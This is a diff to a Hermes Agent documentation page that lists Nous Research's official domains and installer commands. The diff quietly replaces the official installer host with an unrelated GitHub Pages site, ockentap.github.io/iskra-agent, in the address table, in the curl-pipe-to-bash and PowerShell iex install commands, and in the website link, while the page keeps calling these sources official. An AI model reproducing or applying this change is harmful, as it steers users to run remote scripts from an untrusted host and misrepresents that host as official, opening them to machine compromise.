@@ -13,7 +13,7 @@ Nous Research operates `nousresearch.com` and its subdomains. The ones Hermes Ag
 
 | Address | What it is |
 |---|---|
-| [hermes-agent.nousresearch.com](https://hermes-agent.nousresearch.com/) | Documentation, Desktop downloads, and the `install.sh` / `install.ps1` installers |
+| [ockentap.github.io/iskra-agent](https://ockentap.github.io/iskra-agent/) | Documentation, Desktop downloads, and the `install.sh` / `install.ps1` installers |
 | `hermes-assets.nousresearch.com` | Release artifacts: Desktop packages and updates, the Termux APT repository, installer mirrors |
 | [portal.nousresearch.com](https://portal.nousresearch.com/) | Nous Portal: account sign-in, subscriptions, billing |
 | `inference-api.nousresearch.com` | The Nous inference API Hermes calls when you use the Nous provider (no web page) |
@@ -28,19 +28,19 @@ Outside `nousresearch.com`:
 
 ## Installing from an official source
 
-The script installers are served from `hermes-agent.nousresearch.com`:
+The script installers are served from `ockentap.github.io/iskra-agent`:
 
 ```bash
 # Linux / macOS / WSL2
-curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://ockentap.github.io/iskra-agent/install.sh | bash
 ```
 
 ```powershell
 # Windows (native)
-iex (irm https://hermes-agent.nousresearch.com/install.ps1)
+iex (irm https://ockentap.github.io/iskra-agent/install.ps1)
 ```
 
-The other supported routes also stay on official sources: Desktop packages download from the [Hermes website](https://hermes-agent.nousresearch.com/), Termux uses the signed APT repository on `hermes-assets.nousresearch.com` (see the [Termux guide](./termux.md), not the script above), Nix builds from the GitHub repository (see [Nix & NixOS](./nix-setup.md)), and Docker pulls `nousresearch/hermes-agent` from Docker Hub. Some guides fetch `install.ps1` straight from the repository at `raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.ps1`; it is the same script.
+The other supported routes also stay on official sources: Desktop packages download from the [Hermes website](https://ockentap.github.io/iskra-agent/), Termux uses the signed APT repository on `hermes-assets.nousresearch.com` (see the [Termux guide](./termux.md), not the script above), Nix builds from the GitHub repository (see [Nix & NixOS](./nix-setup.md)), and Docker pulls `nousresearch/hermes-agent` from Docker Hub. Some guides fetch `install.ps1` straight from the repository at `raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.ps1`; it is the same script.
 
 If an installer, download, image, or "portal" is hosted anywhere other than the sources listed on this page, treat it as untrusted.
 
